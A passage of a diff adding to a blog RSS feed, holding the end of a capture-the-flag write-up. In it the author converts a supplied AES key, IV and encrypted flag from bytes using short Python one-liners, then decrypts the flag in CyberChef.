+&gt;&lt;/p&gt;
+&lt;p&gt;So, I opened it up, and, lo and behold, there was everything, although not exactly in the format I wanted. Firstly, this was an AES encrypted key, so I was provided with a key and an IV. On top of that, I was given the encrypted flag, however, it was&amp;hellip; well&amp;hellip; encrypted. So I had to do a little messing around&amp;hellip;&lt;/p&gt;
+&lt;h3 id=&#34;the-scripts&#34;&gt;The Scripts
+&lt;/h3&gt;&lt;p&gt;First, the key, IV, and secret were given in bytes. So I had to figure out how to get bytes into human-readable text. I found this solution to that:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;bytes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Which outputs the key for me. It was pretty easy to notice without converting the IV, but the key and IV were the same. I could tell due to the bytes being the same. So I didn&amp;rsquo;t bother to go through the whole process with both. Once I had that, I needed to figure out how to get the encrypted flag.&lt;/p&gt;
+&lt;p&gt;I stumbled around a while trying to figure out how to best output this stuff as putting it into the same script I had for the key just output a garbled mess. So, I made a guess and tried to make a script that outputs hex for me. This is what I came up with:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;bytes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;secret&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;02x&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;finding-the-flag&#34;&gt;Finding The Flag
+&lt;/h3&gt;&lt;p&gt;This gave me the flag in hex. The reason it was so garbled was that it was encrypted with AES, so I took the hex, went into &lt;a class=&#34;link&#34; href=&#34;https://gchq.github.io/CyberChef/#recipe=AES_Decrypt%28%7B%27option%27:%27Hex%27,%27string%27:%27%27%7D,%7B%27option%27:%27Hex%27,%27string%27:%27%27%7D,%27CBC%27,%27Hex%27,%27Raw%27,%7B%27option%27:%27Hex%27,%27string%27:%27%27%7D,%7B%27option%27:%27Hex%27,%27string%27:%27%27%7D%29&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Cyberchef&lt;/a&gt; and put in the AES Decrypt option (which that link should&amp;rsquo;ve led you to). From there, I put the hex in, input the key and IV, changed the format of the key and IV to UTF8, and baked! And that&amp;rsquo;s how I got the flag.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;If you want to see more writeups from me, feel free to comment, or send me a message either of the ways I have available in my &lt;a class=&#34;link&#34; href=&#34;http://kd0ve.github.io/about/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;about&lt;/a&gt;. Let me know if you&amp;rsquo;d like more!&lt;/p&gt;
+&lt;hr&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
